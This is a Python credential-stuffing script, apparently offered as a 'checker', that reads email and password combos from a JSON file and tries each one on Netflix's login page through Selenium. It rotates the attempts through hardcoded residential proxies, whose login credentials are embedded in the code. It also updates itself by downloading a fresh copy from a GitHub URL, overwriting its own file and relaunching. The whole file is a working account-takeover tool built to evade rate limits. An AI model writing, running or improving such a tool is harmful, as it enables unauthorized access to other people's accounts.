# -*- coding: utf-8 -*-  # Indiquer l'encodage UTF-8
import os
import json
import time
import tkinter as tk
from tkinter import filedialog
import requests
import shutil
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from colorama import Fore, Style, init
import sys
import subprocess

# Initialisation de Colorama
init(autoreset=True)

# Version actuelle du script
CURRENT_VERSION = "1.0.2"

# URL du fichier texte qui contient la version la plus récente
VERSION_URL = "https://raw.githubusercontent.com/Sukidadev/crunchyrollchecker/refs/heads/main/latest_version.txt"  # Remplacez par votre URL réelle

# URL de téléchargement de la nouvelle version
DOWNLOAD_URL = "https://raw.githubusercontent.com/Sukidadev/crunchyrollchecker/main/crunchyrollchecker.py"
# Liste des proxys à utiliser
PROXIES = [
    "93291889-zone-custom-region-FR-sessid-DgtOgfNY-sessTime-60:0llEad0L@f.proxys5.net:6200",
    "93291889-zone-custom-region-FR-sessid-PK0y3olo-sessTime-60:0llEad0L@f.proxys5.net:6200",
    ]

def center(var: str, space: int = None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    return "\n".join((" " * int(space)) + var for var in var.splitlines())

def print_ascii_art():
    art_left = r"""
  ██████  █    ██  ██ ▄█▀ 
▒██    ▒  ██  ▓██▒ ██▄█▒ 
░ ▓██▄   ▓██  ▒██░▓███▄░ 
  ▒   ██▒▓▓█  ░██░▓██ █▄ 
▒██████▒▒▒▒█████▓ ▒██▒ █▄
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒▒▒ ▓▒
░ ░▒  ░  ░░▒░ ░ ░ ░▒ ▒░
░  ░  ░   ░░░ ░ ░ ░░ ░ 
      ░     ░     ░  ░   
    """

    art_right = r"""
  ██▓▓ █████▄  ▄▄▄     
▒▓██▒▒ ██▀ ██▌▒████▄   
▒▒██▒░ ██   █▌▒██  ▀█▄ 
░░██░░ ▓█▄   ▌░██▄▄▄▄██
░░██░░▒ ████▓ ▒▓█   ▓██
 ░▓   ▒▒ ▓  ▒ ░▒▒   ▓▒█
░ ▒ ░  ░  ▒  ▒ ░ ░   ▒▒ 
░ ▒ ░  ░  ░  ░   ░   ▒  
  ░      ░          ░   
    """

    for left, right in zip(art_left.splitlines(), art_right.splitlines()):
        print(center(Fore.RED + left + Fore.RED + right))
    print(center(f"{Fore.RED}\ngithub.com/sukidadev\n{Fore.RESET}"))

def check_version():
    try:
        # Récupère la version la plus récente depuis l'URL
        response = requests.get(VERSION_URL)
        latest_version = response.text.strip()

        if CURRENT_VERSION != latest_version:
            print(f"{Fore.RED}[ERROR] Vous utilisez la version {CURRENT_VERSION}.")
            print(f"{Fore.RED}[INFO] Une nouvelle version ({latest_version}) est disponible. Téléchargement en cours...{Style.RESET_ALL}")
            download_new_version()  # Télécharge et remplace le fichier actuel
            relaunch_script()  # Relance le script après mise à jour
    except requests.RequestException as e:
        print(f"{Fore.RED}[ERROR] Impossible de vérifier la version. Détails : {e}")
        exit(1)  # Si la version ne peut pas être vérifiée, on empêche l'exécution

def download_new_version():
    try:
        # Récupérer le contenu du fichier via l'API GitHub
        response = requests.get(DOWNLOAD_URL, headers={'Accept': 'application/vnd.github.v3.raw'})
        if response.status_code == 200:
            # Sauvegarde la nouvelle version dans un fichier
            script_path = sys.argv[0]
            with open(script_path, 'wb') as f:
                f.write(response.content)
            print(f"{Fore.GREEN}[INFO] Nouvelle version téléchargée avec succès.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[ERROR] Impossible de télécharger la nouvelle version : {response.status_code}.{Style.RESET_ALL}")
            exit(1)
    except requests.RequestException as e:
        print(f"{Fore.RED}[ERROR] Erreur lors du téléchargement de la nouvelle version : {e}{Style.RESET_ALL}")
        exit(1)

def relaunch_script():
    print(f"{Fore.CYAN}[INFO] Relancement du script mis à jour...{Style.RESET_ALL}")
    # Utilise subprocess pour relancer le script
    subprocess.Popen([sys.executable] + sys.argv)
    exit(0)  # Quitte le script actuel

def check_credentials(email, password, proxy):
    options = Options()
    options.add_argument(f'--proxy-server=http://{proxy}')
    
    driver = webdriver.Firefox(options=options)
    
    driver.get("https://www.netflix.com/login")
    
    username_field = driver.find_element(By.NAME, "userLoginId")
    password_field = driver.find_element(By.NAME, "password")
    
    username_field.send_keys(email)
    password_field.send_keys(password)
    
    password_field.send_keys(Keys.RETURN)
    
    time.sleep(5)
    
    login_successful = "incorrect" not in driver.page_source
    
    driver.quit()
    return login_successful

def run_script(file_path):
    try:
        if os.path.getsize(file_path) == 0:
            print(f"{Fore.RED}[ERROR] Le fichier combo.json est vide.{Style.RESET_ALL}")
            return

        with open(file_path, 'r') as file:
            combos = json.load(file)
            print(f"{Fore.CYAN}[INFO] Démarrage de la vérification...\n{Style.RESET_ALL}")

            for i, combo in enumerate(combos):
                email = combo["email"]
                password = combo["password"]
                proxy_used = PROXIES[i % len(PROXIES)]  # Utilisez un proxy de la liste


                result = f"Test de connexion pour {email}:{password} via proxy {proxy_used}..."
                print(result)

                if check_credentials(email, password, proxy_used):
                    print(f"{Fore.GREEN}[SUCCESS] Connexion réussie pour: {email}:{password}\n{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[FAIL] La connexion a échoué pour: {email}:{password}\n{Style.RESET_ALL}")

            print(f"{Fore.CYAN}[INFO] Vérification terminée.\n{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Le fichier combo.json n'a pas été trouvé.{Style.RESET_ALL}")
    except json.JSONDecodeError:
        print(f"{Fore.RED}[ERROR] Format invalide dans le fichier JSON.{Style.RESET_ALL}")

def open_file_dialog():
    root = tk.Tk()
    root.withdraw()

    file_path = filedialog.askopenfilename(
        title="Sélectionner le fichier combo.json",
        filetypes=[("Fichier JSON", "*.json")]
    )
    
    if file_path:
        print(f"{Fore.CYAN}[INFO] Fichier sélectionné : {file_path}{Style.RESET_ALL}")
        return file_path
    else:
        print(f"{Fore.RED}[ERROR] Aucun fichier sélectionné.{Style.RESET_ALL}")
        return None

def main():
    print_ascii_art()
    
    check_version()  # Vérifier la version avant de continuer

    file_path = open_file_dialog()

    if file_path:
        run_script(file_path)
    else:
        print(f"{Fore.RED}[ERROR] Processus annulé.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
